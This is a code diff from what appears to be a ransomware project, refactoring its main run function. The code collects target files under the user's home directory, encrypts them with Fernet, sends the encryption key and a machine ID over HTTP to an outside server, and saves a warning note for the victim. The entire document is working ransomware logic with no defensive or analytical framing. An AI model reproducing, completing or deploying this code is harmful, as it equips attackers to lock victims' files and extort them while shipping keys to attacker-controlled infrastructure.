@@ -13,7 +13,7 @@ from pathlib import Path
 
 from cryptography.fernet import Fernet
 
-from encrypter import parse_files
+from encrypter import Encrypter
 from file_scanner import IGNORE_DIRS, TARGET_FILES, get_all_files
 from utils import gen_machine_id, save_warning_text, send_key
 
@@ -26,13 +26,17 @@ MACHINE_ID = gen_machine_id()
 
 
 def run(target: Path | None = None):
+
     target_path = Path.home() if not target else target
+
     files = get_all_files(target_path, TARGET_FILES, IGNORE_DIRS)
+
     print(f"Found {len(files)} files")
-    parse_files(fernet, files)
+
+    enc = Encrypter(files, fernet)
+
+    enc.encrypt()
+
     send_key(f"http://{SERVER_HOST}:{PORT}", KEY, MACHINE_ID)
+
     save_warning_text(MACHINE_ID)
-
-
-if __name__ == "__main__":
-    run()
